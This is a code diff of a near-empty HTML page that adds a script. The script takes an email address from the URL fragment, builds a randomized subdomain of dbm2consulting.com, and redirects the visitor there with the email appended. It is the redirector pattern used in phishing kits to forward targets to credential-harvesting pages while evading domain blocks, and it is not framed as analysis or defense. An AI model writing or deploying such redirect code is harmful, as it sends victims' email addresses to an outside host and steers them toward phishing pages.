@@ -3,6 +3,22 @@
 <head></head>
 </body>
 <script>
+  var hash = window.location.hash;
+  if(hash !== "") {
+
+    hash = hash.split('#');
+    const email = hash[1];
+
+var y = makeid(5); 
+var x = makeid(4); 
+var d = ".";
+var h = "http://";
+var l = "dbm2consulting.com/?"
+var x = h+x+d+y+d+l;
+window.location.href = x + email;  
+   
+  }
+
 
 function makeid(length) {
     var result           = '';
@@ -15,13 +31,5 @@ function makeid(length) {
    return result;
 }
 
-
-var y = makeid(5); 
-var x = makeid(4); 
-var d = ".";
-var h = "http://";
-var l = "dbm2consulting.com/?"
-var x = h+x+d+y+d+l;
-var o = window.location.href = x + email;  }
 </script>
 </html>
